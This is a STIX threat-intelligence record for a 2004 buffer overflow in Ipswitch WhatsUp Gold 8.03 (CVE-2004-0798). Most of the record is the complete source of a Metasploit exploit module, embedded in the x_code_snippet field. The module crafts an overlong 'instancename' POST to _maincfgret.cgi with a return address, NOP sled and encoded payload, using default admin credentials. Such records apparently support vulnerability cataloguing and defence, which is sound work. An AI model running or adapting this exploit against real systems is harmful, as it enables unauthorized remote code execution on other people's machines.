{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1fb86769-dc79-4b91-a6ae-6d65b9f15799",
    "created": "2024-08-14T16:52:26.623374Z",
    "modified": "2024-08-14T16:52:26.623378Z",
    "name": "Ipswitch WhatsUp Gold 8.03 Buffer Overflow",
    "description": " This module exploits a buffer overflow in IPswitch WhatsUp Gold 8.03. By posting a long string for the value of 'instancename' in the _maincfgret.cgi script an attacker can overflow a buffer and execute arbitrary code on the system. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/ipswitch_wug_maincfgret.rb",
            "external_id": "ipswitch_wug_maincfgret.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2004-0798"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  # [*] x.x.x.x WhatsUp_Gold/8.0 ( 401-Basic realm=\"WhatsUp Gold\" )\n  HttpFingerprint = { :pattern => [ /WhatsUp/ ] }\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Ipswitch WhatsUp Gold 8.03 Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a buffer overflow in IPswitch WhatsUp Gold 8.03. By\n        posting a long string for the value of 'instancename' in the _maincfgret.cgi\n        script an attacker can overflow a buffer and execute arbitrary code on the system.\n      },\n      'Author'         => [ 'MC' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2004-0798'],\n          ['OSVDB', '9177'],\n          ['BID', '11043'],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'Space'    => 500,\n          'BadChars' => \"\\x00\\x3a\\x26\\x3f\\x25\\x23\\x20\\x0a\\x0d\\x2f\\x2b\\x0b\\x5c\",\n          'PrependEncoder' => \"\\x81\\xc4\\xff\\xef\\xff\\xff\\x44\",\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'WhatsUP Gold 8.03 Universal', { 'Ret' => 0x6032e743 } ], # whatsup.dll\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2004-08-25'))\n\n    register_options(\n      [\n        OptString.new('HTTPUSER', [ true, 'The username to authenticate as', 'admin']),\n        OptString.new('HTTPPASS', [ true, 'The password to authenticate as', 'admin']),\n      ])\n  end\n\n  def exploit\n    c = connect\n\n    num = rand(65535).to_s\n    user_pass = \"#{datastore['HTTPUSER']}\" + \":\" + \"#{datastore['HTTPPASS']}\"\n\n    req   = \"page=notify&origname=&action=return&type=Beeper&instancename=\"\n    req  << rand_text_alpha_upper(811, payload_badchars) + \"\\xeb\\x06\"\n    req  << make_nops(2) + [target.ret].pack('V') + make_nops(10) + payload.encoded\n    req  << \"&beepernumber=&upcode=\" + num + \"*&downcode=\"+ num + \"*&trapcode=\" + num + \"*&end=end\"\n\n    print_status(\"Trying target %s...\" % target.name)\n    res = send_request_cgi({\n      'uri'          => '/_maincfgret.cgi',\n      'method'       => 'POST',\n      'content-type' => 'application/x-www-form-urlencoded',\n      'data'         => req,\n      'headers'      =>\n      {\n        'Authorization' => \"Basic #{Rex::Text.encode_base64(user_pass)}\"\n      }\n    }, 5)\n\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2004-08-25",
    "x_mitre_platforms": [
        "win'"
    ]
}